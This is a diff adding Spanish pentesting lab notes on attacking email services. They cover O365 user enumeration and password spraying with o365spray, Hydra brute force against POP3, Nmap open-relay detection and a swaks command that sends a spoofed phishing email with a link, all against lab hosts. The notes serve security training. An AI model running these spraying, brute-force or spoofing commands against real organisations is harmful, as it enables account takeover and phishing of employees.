@@ -172,3 +172,125 @@ NSE: Loaded 1 scripts for scanning.
 
 También podemos usar la herramienta Metasploit y utilizar el plugin para enumerar usuarios de un servicio SMTP.  
 
+##### Enumeración Cloud
+
+Existe una herramienta llamada [O365spray](https://github.com/0xZDH/o365spray) que permite enumerar usuarios y contraseñas apuntando a Microsoft Office 365.
+
+```shell-session
+amr251@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
+
+            *** O365 Spray ***            
+
+>----------------------------------------<
+
+   > version        :  2.0.4
+   > domain         :  msplaintext.xyz
+   > validate       :  True
+   > timeout        :  25 seconds
+   > start          :  2022-04-13 09:46:40
+
+>----------------------------------------<
+
+[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
+[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+```
+
+A partir de aquí, podemos identificar usuarios:
+
+```shell-session
+amr251@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 
+```
+
+### Ataques con contraseña
+
+Como ya se ha visto en [[Rompiendo contraseñas]], podemos usar spray password o fuerza bruta contra SMTP, POP3, IMAP4. Primero, necesitamos conseguir una lista de usuarios y contraseñas donde especificamos qué servicio queremos atacar. Por ejemplo, POP3:
+
+```shell-session
+amr251@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+...
+
+[110][pop3] host: 10.129.42.197   login: john   password: Company01!
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Si los servicios en la nube admiten los protocolos SMTP, POP3 o IMAP4, podríamos intentar realizar ataques de password spraying utilizando herramientas como Hydra; sin embargo, estas herramientas suelen ser bloqueadas. En su lugar, podemos utilizar herramientas personalizadas como o365spray o MailSniper para Microsoft Office 365, o CredKing para Gmail u Okta. Es importante tener en cuenta que estas herramientas deben estar actualizadas, ya que si el proveedor del servicio realiza cambios (lo cual ocurre con frecuencia), las herramientas podrían dejar de funcionar. Este es un ejemplo perfecto de por qué debemos comprender el funcionamiento de nuestras herramientas y tener la capacidad de modificarlas si, por alguna razón, no funcionan correctamente.
+
+##### Password spraying con O365
+
+```shell-session
+amr251@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+```
+
+### Ataques específicos del protocolo
+
+Un **open relay** es un servidor SMTP (Protocolo Simple de Transferencia de Correo) que está mal configurado y permite el reenvío de correos electrónicos sin autenticación. Los servidores de mensajería que están configurados accidental o intencionalmente como open relays permiten que el correo de cualquier fuente sea reenviado a través del servidor open relay. Este comportamiento oculta la fuente original de los mensajes y hace que parezca que el correo se originó desde el servidor open relay.
+
+##### Open Relay
+
+Desde el punto de vista de un atacante, podemos abusar de esto para realizar phishing enviando correos electrónicos como usuarios inexistentes o suplantando la dirección de correo de otra persona. Por ejemplo, imagina que estamos apuntando a una empresa con un servidor de correo open relay, y identificamos que utilizan una dirección de correo específica para enviar notificaciones a sus empleados. Podemos enviar un correo similar utilizando la misma dirección y añadir nuestro enlace de phishing con esta información. Con el script `smtp-open-relay` de Nmap, podemos identificar si un puerto SMTP permite un open relay.
+
+```shell-session
+amr251@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
+Nmap scan report for 10.10.11.213
+Host is up (0.28s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+|_smtp-open-relay: Server is an open relay (14/16 tests)
+```
+
+Después, podemos usar cualquier cliente para conectarnos al servidor y enviar nuestro email.
+
+```shell-session
+amr251@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+<-  220 mail.localdomain SMTP Mailer ready
+ -> EHLO parrot
+<-  250-mail.localdomain
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-STARTTLS
+<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+<-  250 HELP
+ -> MAIL FROM:<notifications@inlanefreight.com>
+<-  250 OK
+ -> RCPT TO:<employees@inlanefreight.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -> To: employees@inlanefreight.com
+ -> From: notifications@inlanefreight.com
+ -> Subject: Company Notification
+ -> Message-Id: <20201029013606.775675@parrot>
+ -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ -> 
+ -> 
+ -> .
+<-  250 OK
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
+```
+
+##### Enumeración de usuarios con SMTP-enum
+
+```bash
+smtp-user-enum -M RCPT -U users.list -t 10.129.204.93 -D inlanefreight.htb
+```
+
+##### Adivinación de contraseñas con Hydra
+
+```bash
+hydra -l "marlin@inlanefreight.htb" -P ../resources/pws.list -f inlanefreight.htb pop3
+```
+
+> *Nota: Se usa el dominio inlanefreight.htb porque previamente lo hemos añadido a `/etc/hosts`*
+
